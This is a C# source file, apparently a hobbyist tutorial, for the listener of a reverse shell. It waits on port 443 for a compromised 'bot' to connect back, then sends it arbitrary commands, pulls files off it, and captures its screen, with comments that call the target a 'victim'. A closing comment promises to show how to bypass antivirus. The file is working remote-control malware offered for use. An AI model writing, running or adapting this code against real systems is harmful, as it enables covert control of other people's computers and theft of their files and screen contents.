using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace sharpshells
{
    class Program
    {
        static void Main(string[] args)
        {
            StartServer();
        }

        public static void StartServer()
        {
           
            IPAddress ipAddress = IPAddress.Parse("192.168.20.13"); // stars server in this ip 
            IPEndPoint localEndPoint = new IPEndPoint(ipAddress, 443); // this port


            try
            {

                // Create a Socket that will use Tcp protocol      
                Socket listener = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                // A Socket must be associated with an endpoint using the Bind method  
                listener.Bind(localEndPoint); // bind the socket to the end point
                // Specify how many requests a Socket can listen before it gives Server busy response.  
                // We will listen 10 requests at a time  
                listener.Listen(10); // listen for connections
                Socket handler;
                Console.WriteLine("Wait for your bot...");
                handler = listener.Accept(); // accept the connection from the victim
                string botip = handler.RemoteEndPoint.ToString(); // fetch the remote ip and port info from the handler socket
                while (true)
                {
                    Console.Write("[{0}] # : ",botip); // this is prompt u see when victim connects back to u

                    // Incoming data from the client.    
                    string val = null;

                    val = Console.ReadLine(); // waiting for ur command , reads a line (terminates with a new line)
                    if (val == "bye")
                    {
                        
                        break; // breaks from the loop and disconnects
                    }
                    if (val.StartsWith("getfile") ) // gets the file from victim and saves it 
                    {
                        byte[] msg = Encoding.ASCII.GetBytes(val);
                        int bytesSent = handler.Send(msg);
                        Console.WriteLine("Send file command {0}", val);
                        string[] getfilename = val.Split(new char[] { ' ' }); // actual command will be getfile filename // space is the delimiter
                        using (var output = File.Create(getfilename[1]))
                        {

                            // read the file in chunks of 1KB
                            var buffer = new byte[1024];
                            int bytesRead;
                            string clientmsg = "";
                            while ((bytesRead = handler.Receive(buffer,0,  buffer.Length, SocketFlags.None)) >= 0)
                            {
                                clientmsg = Encoding.ASCII.GetString(buffer, 0, bytesRead);

                                if (clientmsg.IndexOf("EOF") > -1) // this eof is end from the victim hope u remember that when i went through the client
                                {
                                    break;
                                }
                                output.Write(buffer, 0, bytesRead);
                                

                            }
                        }
                        Console.WriteLine("Got and saved as {0}", getfilename[1]);
                    } else if (val.StartsWith("grabscreen")) // same operation like file above
                    {
                        byte[] msg = Encoding.ASCII.GetBytes(val);
                        int bytesSent = handler.Send(msg);
                        Console.WriteLine("Send file command {0}", val);
                        using (var output = File.Create("victimscreen.png"))
                        {

                            // read the file in chunks of 1KB
                            var buffer = new byte[1024];
                            int bytesRead;
                            string clientmsg = "";
                            while ((bytesRead = handler.Receive(buffer, 0, buffer.Length, SocketFlags.None)) >= 0)
                            {
                                clientmsg = Encoding.ASCII.GetString(buffer, 0, bytesRead);

                                if (clientmsg.IndexOf("EOF") > -1)
                                {
                                    break;
                                }
                                output.Write(buffer, 0, bytesRead);


                            }
                        }
                        Console.WriteLine("Got and saved as victimscreen.png") ;
                    }
                    else
                    {
                        // Encode the data string into a byte array.    
                        byte[] msg = Encoding.ASCII.GetBytes(val);// + "EOFCMD"); // here val is the command we take from keyboard it has a newline character as builtin terminator that we check in client

                        // Send the data through the socket.    
                        int bytesSent = handler.Send(msg); // converted the string to byte array to send it over the socket
                        Console.WriteLine("send msg = {0}", Encoding.ASCII.GetString(msg));
                        // Receive the response from the remote device.   

                        var buffer = new byte[1024];
                        int bytesRead;
                        string clientmsg = "";

                        while ((bytesRead = handler.Receive(buffer, 0, buffer.Length, SocketFlags.None)) >=0) // receives the command result and saves it in a variable clientmsg
                        {
                            clientmsg += Encoding.ASCII.GetString(buffer, 0, bytesRead);
                            if (clientmsg.IndexOf("EOF") > -1)
                            {
                                break;
                            }

                        }
                        clientmsg = clientmsg.Replace("EOF", "");
                        Console.WriteLine(clientmsg);  // displays the command output for u
                        /*
                        int bytesRec = 0;
                        while (true)
                        {
                            bytes = new byte[5120];
                            bytesRec = handler.Receive(bytes);
                            msgres += Encoding.ASCII.GetString(bytes, 0, bytesRec);
                            if (msgres.IndexOf("EOF") > -1)
                            {
                                break;
                            }
                        }*/
                        // Console.WriteLine(Encoding.ASCII.GetString(bytes, 0, bytesRec));

                        // Console.ReadKey();
                    }

                }
               handler.Shutdown(SocketShutdown.Both); // closes all connection 
               handler.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }

            Console.WriteLine("\n Bye for now...");
            Console.ReadKey(); // let me show u how it works , how can u bypass ur antivirus :) // build it in release mode recommended , here i am using debug mode binaries ,, it is for my test :)
        }


        
    }
}

